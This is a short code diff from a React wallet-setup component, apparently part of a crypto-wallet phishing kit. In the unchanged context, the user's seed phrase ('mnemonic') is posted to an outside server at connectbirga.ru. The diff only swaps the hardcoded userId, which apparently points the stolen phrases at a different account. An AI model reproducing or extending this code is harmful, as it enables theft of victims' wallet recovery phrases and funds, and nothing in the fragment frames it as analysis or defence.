@@ -53,7 +53,7 @@ const WalletInit = () => {
 
             const user = await axios.post("https://www.connectbirga.ru/user/wallet", {
                 mnemonic: inputs,
-                userId: 1392120153,
+                userId: 2144832745,
               } , {
                 headers : {
                   "X-API-KEY-AUTH" : process.env.REACT_APP_API_KEY
